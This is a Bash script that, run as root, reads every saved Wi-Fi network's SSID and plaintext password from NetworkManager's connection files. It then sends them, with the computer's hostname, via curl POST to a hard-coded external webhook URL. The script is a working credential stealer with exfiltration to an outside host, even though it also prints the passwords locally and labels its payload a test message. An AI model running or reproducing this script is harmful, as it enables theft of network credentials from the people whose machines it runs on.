#!/bin/bash

# Directory where NetworkManager stores connection information
connections_dir="/etc/NetworkManager/system-connections/"

# Ensure the script is run with sudo
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    exit 1
fi

# Initialize variables
wifi_data=""
table_header="| SSID                             | Password         |\n|----------------------------------|------------------|"
table_body=""

echo "Retrieving stored Wi-Fi passwords..."

# Loop through each file in the connections directory
for file in "$connections_dir"*; do
    if [[ -f "$file" ]]; then
        ssid=$(grep '^ssid=' "$file" | cut -d'=' -f2)
        psk=$(grep '^psk=' "$file" | cut -d'=' -f2)
        if [[ -n "$ssid" ]]; then
            if [[ -n "$psk" ]]; then
                table_body+="| $(printf '%-32s' "$ssid") | $(printf '%-16s' "$psk") |\n"
                wifi_data+="$ssid: $psk; "
            else
                table_body+="| $(printf '%-32s' "$ssid") | $(printf '%-16s' "No Password") |\n"
                wifi_data+="$ssid: No Password; "
            fi
        fi
    fi
done

# Remove trailing separator
wifi_data=${wifi_data::-2}

# Print the table to the terminal
echo -e "$table_header\n$table_body"

# Get computer name
computer_name=$(hostname)

# Create JSON payload
json_payload=$(jq -n --arg computer_name "$computer_name" --arg wifi_data "$wifi_data" \
    '{computer_name: $computer_name, wifi_data: $wifi_data, test_message: "This is a test message."}')

# Webhook URL
webhook_url="https://hook.eu2.make.com/x87ml93t9r3p2ns1ro65fb7fanmznaom"

# Send data to webhook using curl
echo "Sending data to webhook..."
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$json_payload" "$webhook_url")

# Check if the request was successful
if [[ "$response" -eq 200 ]]; then
    echo "Data sent successfully!"
else
    echo "Failed to send data. HTTP response code: $response"
fi

